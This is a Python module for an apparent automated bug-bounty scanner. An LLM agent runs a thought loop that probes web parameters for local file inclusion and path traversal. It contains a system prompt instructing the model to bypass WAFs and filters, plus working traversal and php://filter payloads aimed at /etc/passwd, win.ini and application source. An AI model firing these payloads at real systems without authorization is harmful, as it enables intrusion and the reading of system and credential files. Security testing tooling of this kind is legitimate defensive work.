#!/usr/bin/env python3
"""
Smart LFI Hunter - ThoughtLoop based LFI/Path Traversal specialist
"""
import logging
import re
from typing import Dict, Any, Tuple, Optional, List

from src.core.agents.swarm.thought_loop import ThoughtLoop
from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence
from src.core.models.llm import LLMClient
from src.core.infra.network_client import AsyncNetworkClient
from src.core.infra.smart_request import SmartRequest

logger = logging.getLogger(__name__)

class SmartLFIHunter(Specialist, ThoughtLoop):
    """
    思考ループ（ThoughtLoop）を持つ LFI スペシャリスト。
    WAF やフィルタを回避するためのバイパス戦略を LLM を用いて自律的に考案します。
    """

    name = "SmartLFIHunter"
    description = "LFI/Path Traversal Specialist with AI reasoning"

    SYSTEM_PROMPT = """You are an expert LFI/Path Traversal Penetration Tester.
You must work in a thought loop to detect and bypass filters for LFI vulnerabilities.

Commands:
- ACTION: request
  INPUT: [The payload to test]

- ACTION: finish
  INPUT: [vulnerable|safe|unknown]

CRITICAL FORMAT RULES (VIOLATION = IMMEDIATE RETRY):
1. You MUST use EXACTLY this format for EVERY turn:
   THOUGHT: [Your reasoning]
   ACTION: [request|finish]
   INPUT: [payload or vulnerable/safe/unknown]

2. NEVER write "Observation:" or "observation" - this is PROVIDED BY THE TOOL after your Action.
3. NEVER write "Final Answer:" or "Conclusion:" - use "ACTION: finish" instead.
4. NEVER fabricate tool outputs or observations.
5. If you write invalid format, the system will FORCE RETRY.

Guidelines:
1. Target identifiers: /etc/passwd (Linux), C:\\windows\\win.ini (Windows), index.php (PHP wrappers).
2. If standard traversal (../../) is blocked, try:
   - Double encoding: ..%252f
   - Null byte: /etc/passwd%00 (for older PHP)
   - Recursive filters: ....//....//
   - PHP wrappers: php://filter/convert.base64-encode/resource=index
   - Various slash types: ..\\..\\, ..//..//
3. Analyze the observation (status, body, diff) to adapt your next payload.

Format:
THOUGHT: [Reasoning about the next payload strategy based on previous observations]
ACTION: [Command]
INPUT: [Input]
"""

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        Specialist.__init__(self, config)
        ThoughtLoop.__init__(self, max_turns=8)

        # Resolve run mode: config["mode"] (truthy) > global settings.mode >
        # "bugbounty". Prevents Guard fail-close on vulntest/ctf runs.
        from src.core.config.settings import resolve_run_mode
        mode = resolve_run_mode(
            config.get("mode") if (config and isinstance(config, dict)) else None
        )

        self.llm = LLMClient(role="lfi_specialist")
        # SmartRequest requires an AsyncNetworkClient instance
        self.network_client = AsyncNetworkClient(mode=mode)
        from src.core.security.execution_safeguard import get_execution_safeguard
        safeguard = get_execution_safeguard(mode=mode)
        self.smart_client = SmartRequest(network_client=self.network_client, execution_safeguard=safeguard)
        self.vulnerable = False
        self.evidence = ""
        self.last_delivery_evidence: Dict[str, Any] = {}

    async def close(self):
        if self.network_client:
            await self.network_client.close()

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        """
        Specialist としてのエントリーポイント
        
        Args:
            task: タスク情報
            quick_mode: True の場合、軽量モードで実行（ターン数制限あり）
        """
        logger.info(f"[{self.name}] Starting ThoughtLoop for {task.target} (quick_mode={quick_mode})")

        # quick_mode の場合、ターン数を制限（デフォルト 8→8、変更なし）
        original_max_turns = self.max_turns
        if quick_mode:
            self.max_turns = 8  # 3 ターンでは不十分なため 8 ターンに

        # タイムアウト制御付きで実行（Layer 2 リトライを考慮して延長）
        # quick_mode: 300 秒、通常：600 秒
        timeout = 300 if quick_mode else 600
        import asyncio
        try:
            result = await asyncio.wait_for(
                self.run_as_tool(task.target, task.params),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            logger.warning(f"[{self.name}] Timeout after {timeout}s for {task.target}")
            return []
        finally:
            # max_turns を元に戻す
            self.max_turns = original_max_turns

        findings = []
        if result.get("vulnerable"):
            tested_param = result.get("param")
            delivery = result.get("delivery_evidence", {}) if isinstance(result.get("delivery_evidence"), dict) else {}
            finding = Finding(
                vuln_type=VulnType.LFI,
                severity=Severity.HIGH,
                title=f"LFI/Path Traversal in parameter '{result.get('param', 'unknown')}'",
                description=result.get("description", "Detected by SmartLFIHunter."),
                target_url=task.target,
                evidence=Evidence(
                    request_method=str(delivery.get("request_method", "") or ""),
                    request_url=str(delivery.get("request_url", "") or task.target),
                    response_status=int(delivery.get("response_status", 0) or 0),
                    response_body=str(delivery.get("response_body", "") or result.get("evidence", ""))
                ),
                source_agent=self.name,
                confidence=0.9,
                tags=["lfi", "smart_agent"],
                additional_info={
                    "parameter": tested_param,
                    "tested_params": [tested_param] if tested_param else [],
                    "payload": result.get("payloads_used", [""])[-1] if result.get("payloads_used") else "",
                    "file_marker_excerpt": str(result.get("file_marker_excerpt", "") or ""),
                    "target_file": str(result.get("target_file", "") or ""),
                    "poc_request": str(delivery.get("poc_request", "") or ""),
                    "poc_response": str(delivery.get("poc_response", "") or ""),
                    "payload_delivery": {
                        "status": int(delivery.get("response_status", 0) or 0),
                        "delivered": bool(delivery.get("delivered", False)),
                        "request_url": str(delivery.get("request_url", "") or ""),
                        "content_type": str(delivery.get("content_type", "") or ""),
                        "body_length": int(delivery.get("body_length", 0) or 0),
                    },
                }
            )
            findings.append(finding)

        return findings

    async def run_as_tool(self, url: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Manager から呼び出し可能な Tool メソッド。"""
        params = params or {}
        _auth = params.get("_auth", {})
        auth_headers = _auth.get("auth_headers", {})
        cookies_str = _auth.get("cookies", "")

        method = params.get("method", "GET").upper()
        target = url

        META_KEYS = {
            "_auth", "method", "content_type", "task_id",
            "targets", "targets_file", "source_file", "cookies",
            "tags", "category", "_context", "extra_targets",
            "auth_headers", "headers", "count",
            # manager metadata (not injectable params)
            "forms", "url_evidence", "scan_profile", "profile",
            "detection_mode", "phase", "phase_hint",
            "phase2_on_empty_phase1", "phase2_max_seconds",
            "phase2_max_seconds_risk_forced", "phase2_risk_force_vuln_types",
            "phase1_force_full_coverage", "phase1_stop_on_first_hit",
            "phase1_early_return_on_findings", "per_url_timeout_seconds",
            "per_url_timeout_by_type",
        }

        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(target)
        url_params = parse_qs(parsed.query)
        url_params_flat = {k: v[0] if v else "" for k, v in url_params.items()}

        payload_params: Dict[str, Any] = {}
        for key, value in params.items():
            if not key or key in META_KEYS or str(key).startswith("_"):
                continue
            # nested structures are manager context metadata, not injectable values
            if isinstance(value, (dict, list, tuple, set)):
                continue
            payload_params[str(key)] = value

        # GET の場合は URL クエリを優先して注入対象を決める
        if method == "GET" and url_params_flat:
            merged_params = dict(url_params_flat)
            merged_params.update(payload_params)
            payload_params = merged_params
        elif not payload_params:
            payload_params = url_params_flat

        tested_param_names = [k for k in payload_params.keys() if k]

        if cookies_str and "Cookie" not in auth_headers:
            auth_headers["Cookie"] = cookies_str

        # ThoughtLoop コンテキスト設定
        self.context = {
            "target": target,
            "param": list(payload_params.keys())[0] if payload_params else None,
            "method": method,
            "params": payload_params,
            "auth_headers": auth_headers,
            "cookies": cookies_str,
        }

        # State 初期化
        self.vulnerable = False
        self.evidence = ""
        self.used_payloads = []
        self.last_delivery_evidence = {}
        loop_result: Dict[str, Any] = {"status": "not_run"}
        deterministic = await self._run_lfi_deterministic_precheck(tested_param_names)
        if deterministic.get("confirmed"):
            self.vulnerable = True
            self.context["param"] = deterministic.get("param", self.context.get("param"))
            self.evidence = str(deterministic.get("evidence", "LFI signal confirmed"))
            self.last_delivery_evidence = deterministic.get("delivery_evidence", {}) if isinstance(deterministic.get("delivery_evidence"), dict) else {}
            payload = str(deterministic.get("payload", "") or "")
            if payload and payload not in self.used_payloads:
                self.used_payloads.append(payload)
            loop_result = {"status": "deterministic_precheck_confirmed", **deterministic}
        else:
            self.history_messages = []
            self.history_messages.append({"role": "system", "content": self.SYSTEM_PROMPT})

            initial_prompt = f"""Target URL: {target}
Method: {method}
Parameter: {self.context['param']}
Original Value: {payload_params.get(self.context['param'], '') if payload_params else ''}

Start your LFI/Path Traversal testing.
"""
            self.history_messages.append({"role": "user", "content": initial_prompt})

            # ThoughtLoop を実行（親クラスの run_loop を使用）
            try:
                loop_result = await self.run_loop(self.context)
            except Exception as e:
                logger.error(f"[{self.name}] ThoughtLoop failed: {e}")
                loop_result = {"status": "failed", "error": str(e)}

        return {
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "param": self.context.get("param"),
            "tested_params": tested_param_names,
            "payloads_used": self.used_payloads,
            "description": f"LFI detected." if self.vulnerable else "No LFI detected.",
            "loop_result": loop_result,
            "file_marker_excerpt": str(loop_result.get("file_marker_excerpt", "") or ""),
            "target_file": str(loop_result.get("target_file", "") or ""),
            "delivery_evidence": self.last_delivery_evidence,
        }

    async def _run_lfi_deterministic_precheck(self, tested_params: List[str]) -> Dict[str, Any]:
        """
        LLM 前段で汎用 LFI/Traversal payload を軽量検証する。
        """
        if not tested_params:
            return {"confirmed": False}

        from urllib.parse import urlparse
        path = urlparse(str(self.context.get("target", ""))).path.strip("/")
        depth_hint = max(4, path.count("/") + 2)

        probe_payloads = [
            "../" * (depth_hint + 2) + "etc/passwd",
            "../" * depth_hint + "etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

        for param_name in tested_params:
            self.context["param"] = param_name
            for payload in probe_payloads:
                obs = await self._send_request(payload)
                if obs.get("diff") == "lfi_found":
                    delivery = {
                        "request_method": obs.get("request_method", ""),
                        "request_url": obs.get("request_url", ""),
                        "response_status": obs.get("status", 0),
                        "response_body": obs.get("body_snippet", ""),
                        "poc_request": obs.get("poc_request", ""),
                        "poc_response": obs.get("poc_response", ""),
                        "content_type": obs.get("content_type", ""),
                        "body_length": obs.get("body_length", 0),
                        "delivered": True,
                    }
                    return {
                        "confirmed": True,
                        "param": param_name,
                        "payload": payload,
                        "target_file": self._infer_target_file(payload),
                        "file_marker_excerpt": str(obs.get("file_marker_excerpt", "") or obs.get("match", "") or ""),
                        "delivery_evidence": delivery,
                        "evidence": (
                            f"Deterministic LFI signal on '{param_name}'"
                            + (f" (matched: {obs.get('match')})" if obs.get("match") else "")
                        ),
                    }

        return {"confirmed": False}

    async def decide(self, turn: int) -> Tuple[str, str, Any]:
        """
        LLM decides the next move.
        
        LLM の出力を検証し、不正な形式（Observation の自己生成など）を検出したらリトライ。
        """
        history_lines = []
        for s in self.history:
            if hasattr(s, "turn"):
                history_lines.append(
                    f"Turn {s.turn}: Act={s.action}({s.action_input}) -> {s.observation}"
                )
            elif isinstance(s, dict):
                history_lines.append(
                    f"Turn {s.get('turn', '?')}: Act={s.get('action', '?')}({s.get('action_input', s.get('input', ''))}) -> {s.get('observation', '')}"
                )
        history_text = "\n".join(history_lines)

        prompt = f"""Target: {self.context['target']}
Testing Parameter: {self.context['param']}
Method: {self.context['method']}
Current Turn: {turn}

History:
{history_text if history_text else 'No previous actions'}

Decide next step for LFI testing.
"""
        response = await self.llm.agenerate([
            {"role": "system", "content": self.SYSTEM_PROMPT},
            {"role": "user", "content": prompt}
        ])

        content = response.choices[0].message.content if response and response.choices else ""

        # フォールバック
        if not content:
            logger.warning(f"Turn {turn}: LLM returned empty content. Forcing finish.")
            return "Analysis complete (LLM empty)", "finish", "safe"

        # Layer 2: LLM 出力の厳密な検証
        if "Observation:" in content or "observation" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Observation:'! Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: Do NOT write 'Observation:'. Observation is PROVIDED BY THE TOOL. Only output THOUGHT, ACTION, and INPUT."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (invalid format)", "finish", "safe"

        if "Final Answer:" in content or "final answer" in content.lower():
            logger.warning(f"Turn {turn}: LLM wrote 'Final Answer:'! Forcing retry...")
            self.history.append({
                "role": "user",
                "content": "ERROR: Use 'ACTION: finish' instead of 'Final Answer:'. Please retry."
            })
            if turn < self.max_turns:
                return await self.decide(turn)
            else:
                return "Analysis complete (invalid format)", "finish", "safe"

        # Parse
        thought = "Analyzing..."
        action = "finish"
        action_input = "safe"

        thought_match = re.search(r'THOUGHT:\s*(.+?)(?=\nACTION:|$)', content, re.DOTALL | re.IGNORECASE)
        action_match = re.search(r'ACTION:\s*([a-zA-Z_]+)', content, re.IGNORECASE)
        input_match = re.search(r'INPUT:\s*(.+)', content, re.IGNORECASE)

        if thought_match:
            thought = thought_match.group(1).strip()
        if action_match:
            action = action_match.group(1).strip().lower()
        if input_match:
            action_input = input_match.group(1).strip()

        return thought, action, action_input

    async def act(self, action: str, action_input: Any) -> str:
        """Execute action (ThoughtLoop abstract method)."""
        if action == "finish":
            if "vulnerable" in str(action_input).lower():
                self.vulnerable = True
                self.evidence = str(action_input)
            return f"Finished: {action_input}"

        if action == "request":
            payload = str(action_input)
            self.used_payloads.append(payload)

            # リクエスト送信
            obs = await self._send_request(payload)
            if obs.get("diff") == "lfi_found":
                self.last_delivery_evidence = {
                    "request_method": obs.get("request_method", ""),
                    "request_url": obs.get("request_url", ""),
                    "response_status": obs.get("status", 0),
                    "response_body": obs.get("body_snippet", ""),
                    "poc_request": obs.get("poc_request", ""),
                    "poc_response": obs.get("poc_response", ""),
                    "content_type": obs.get("content_type", ""),
                    "body_length": obs.get("body_length", 0),
                    "delivered": True,
                }
            return f"Observation: Status={obs['status']}, Diff={obs['diff']}, Body={obs['body_snippet']}"

        return f"Unknown action: {action}"

    async def should_stop(self, step) -> bool:
        """Check if we should stop."""
        # SGK-2026-0441 ⑤: a payout-grade PoC also stops the loop (additive;
        # the existing finish condition is preserved).
        if step.action == "finish":
            return True
        if self._payout_grade_obtained():
            return True
        return False

    def _payout_grade_obtained(self) -> bool:
        """SGK-2026-0441 ⑤: payout-grade PoC stop trigger (additive,
        fail-closed). True only when the candidate finding projected from
        the specialist's delivery evidence (PoC pair + file-content marker +
        impact + reproduction steps) is payout-grade. No candidate state
        -> False.
        """
        delivery = getattr(self, "last_delivery_evidence", None) or {}
        if not isinstance(delivery, dict) or not delivery.get("poc_request") or not delivery.get("poc_response"):
            return False
        from src.core.agents.swarm.injection.payout_grade import evaluate_payout_grade

        candidate = {
            "vuln_type": "lfi",
            "evidence": {
                "request_method": str(delivery.get("request_method", "") or ""),
                "request_url": str(delivery.get("request_url", "") or ""),
                "response_status": delivery.get("response_status", 0),
                "response_body": str(delivery.get("response_body", "") or ""),
            },
            "additional_info": {
                "poc_request": str(delivery.get("poc_request", "") or ""),
                "poc_response": str(delivery.get("poc_response", "") or ""),
                "file_marker_excerpt": str(delivery.get("file_marker_excerpt", "") or ""),
            },
            "impact": str(getattr(self, "evidence", "") or ""),
            "reproduction_steps": [
                str(p) for p in (getattr(self, "used_payloads", None) or [])
            ],
        }
        try:
            return evaluate_payout_grade(candidate).payout_grade
        except Exception:  # noqa: BLE001 — fail closed, never stop on error
            return False

    def get_result(self) -> Dict[str, Any]:
        """Override to return LFI-specific result."""
        return {
            "status": self.status.value,
            "turns": len(self.history),
            "vulnerable": self.vulnerable,
            "evidence": self.evidence,
            "payloads_used": self.used_payloads,
            "delivery_evidence": self.last_delivery_evidence,
        }

    @staticmethod
    def _infer_target_file(payload: str) -> str:
        payload_text = str(payload or "")
        lowered = payload_text.lower()
        if "etc/passwd" in lowered:
            return "/etc/passwd"
        if "win.ini" in lowered:
            return "C:\\windows\\win.ini"
        if "php://filter" in lowered:
            return "php://filter"
        return payload_text

    async def _send_request(self, payload: str) -> Dict[str, Any]:
        """実際のリクエストを送信し、結果を返す"""
        param = self.context.get("param")
        target = self.context.get("target")
        method = self.context.get("method", "GET")
        auth_headers = self.context.get("auth_headers", {})
        params = self.context.get("params", {}).copy()

        if param and param in params:
            params[param] = payload

        try:
            request_url = target
            request_method = method
            if method == "POST":
                resp = await self.smart_client.request(
                    "POST",
                    target,
                    data=params,
                    headers=auth_headers,
                    timeout=60
                )
            else:
                from urllib.parse import urlparse, urlencode, urlunparse
                parsed = urlparse(target)
                new_query = urlencode(params)
                new_url = urlunparse(parsed._replace(query=new_query))
                request_url = new_url

                resp = await self.smart_client.request(
                    "GET",
                    new_url,
                    headers=auth_headers,
                    timeout=60
                )

            # SmartRequest のレスポンスは辞書オブジェクト
            raw_body = str(resp.get("body", "") or "")
            body_snippet = raw_body[:500]
            status = resp.get("status", 0)
            error = resp.get("error")
            headers = resp.get("headers", {}) if isinstance(resp.get("headers", {}), dict) else {}
            content_type = str(headers.get("Content-Type", headers.get("content-type", "")) or "")
            poc_request = self._build_poc_request(method=request_method, request_url=request_url, body=params if method == "POST" else None)
            poc_response = self._build_poc_response(status=status, body=body_snippet, headers=headers)

            # RequestGuard などでブロックされた場合
            if error or status == 0:
                logger.warning(f"[{self.name}] Request blocked or failed: {error}")
                return {
                    "status": status,
                    "diff": "blocked",
                    "body_snippet": f"Blocked: {error}",
                    "request_method": request_method,
                    "request_url": request_url,
                    "poc_request": poc_request,
                    "poc_response": poc_response,
                    "content_type": content_type,
                    "body_length": len(raw_body),
                }

            lfi_patterns = [
                r"root:[^\n]*:0:0:",
                r"daemon:[^\n]*:[0-9]+:[0-9]+:",
                r"bin:[^\n]*:1:1:",
                r"www-data:[^\n]*:[0-9]+:[0-9]+:",
                r"\[extensions\]",
                r"\[fonts\]",
                r"\[boot loader\]",
                r"\[mci extensions\]",
                r"PD9waH[A-Za-z0-9+/=]{8,}",
            ]
            matched_pattern = None
            matched_excerpt = ""
            for pattern in lfi_patterns:
                match = re.search(pattern, raw_body, re.IGNORECASE | re.MULTILINE)
                if match:
                    matched_pattern = pattern
                    matched_excerpt = match.group(0)[:120]
                    break
            diff = "lfi_found" if matched_pattern else "normal"

            return {
                "status": status,
                "diff": diff,
                "body_snippet": body_snippet[:200],
                "match": matched_pattern or "",
                "file_marker_excerpt": matched_excerpt,
                "request_method": request_method,
                "request_url": request_url,
                "poc_request": poc_request,
                "poc_response": poc_response,
                "content_type": content_type,
                "body_length": len(raw_body),
            }

        except Exception as e:
            logger.error(f"[{self.name}] Request failed: {e}")
            return {"status": 0, "diff": "error", "body_snippet": str(e)}

    @staticmethod
    def _build_poc_request(*, method: str, request_url: str, body: Any = None) -> str:
        from urllib.parse import urlparse
        parsed = urlparse(str(request_url or ""))
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        host = parsed.netloc or parsed.hostname or "target"
        lines = [f"{str(method or 'GET').upper()} {path} HTTP/1.1", f"Host: {host}"]
        if body is not None:
            lines.append("Content-Type: application/x-www-form-urlencoded")
            lines.append("")
            from urllib.parse import urlencode
            lines.append(urlencode(body))
        return "\n".join(lines)

    @staticmethod
    def _build_poc_response(*, status: Any, body: str, headers: Dict[str, Any] | None = None) -> str:
        status_int = int(status or 0)
        header_lines = [f"HTTP/1.1 {status_int}"]
        for key, value in (headers or {}).items():
            if str(key).lower() in {"set-cookie", "cookie", "authorization"}:
                continue
            header_lines.append(f"{key}: {value}")
        header_lines.append("")
        header_lines.append(str(body or ""))
        return "\n".join(header_lines)
